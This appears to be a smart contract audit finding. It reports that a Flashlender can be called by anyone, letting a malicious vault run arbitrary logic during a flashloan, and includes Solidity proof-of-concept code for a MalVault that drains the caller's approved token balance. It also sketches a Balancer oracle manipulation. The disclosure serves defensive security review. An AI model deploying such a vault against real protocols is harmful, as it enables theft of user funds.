# Vulnerability details

## Impact
Flashlender can be called from an arbitrary address and execute a flashloan. During the course of this flashloan, it is possible for a malicious vault whose modifyCollateralAndDebt method can implement arbitrary logic. While not demonstrated here, so long as this arbitrary logic can result in a profitable attack, ie repay the flashloan, the call will succeed. This PoC simulates a profitable attack by minting the underlying token to the position action. I am not sure I will have time to update this issue in the time remaining with a profitable attack vector, hence why risk is medium and not high. 

One less handwavy thought experiment is using the flashloan to execute a large swap in a balancer weighted pool to manipulate the balancerOracle. BalancerOracle.sol uses the weighted pools getInvariant() method, which uses the weighted pools balances as part of the calculation.

pragma solidity ^0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {MalToken} from "./MalToken.sol";
contract MalVault {
    using SafeERC20 for IERC20;
    IERC20 token_;
    address owner;
    IERC20 mal;

    constructor(address _token) {
        owner = msg.sender;
        token_ = IERC20(_token);
        mal = IERC20(new MalToken());
    }
    function token() external view returns (IERC20) {
        return IERC20(mal);
    }
    function modifyCollateralAndDebt(address position, address collateralizer, address creditor, int256 deltaCollateral, int256 deltaDebt) external {
        uint bal = token_.balanceOf(msg.sender);
        uint allowance = token_.allowance(msg.sender, address(this));
        require(allowance >= bal, "MalVault: Insufficient allowance");
        token_.safeTransferFrom(msg.sender, address(this), bal);
    }
}
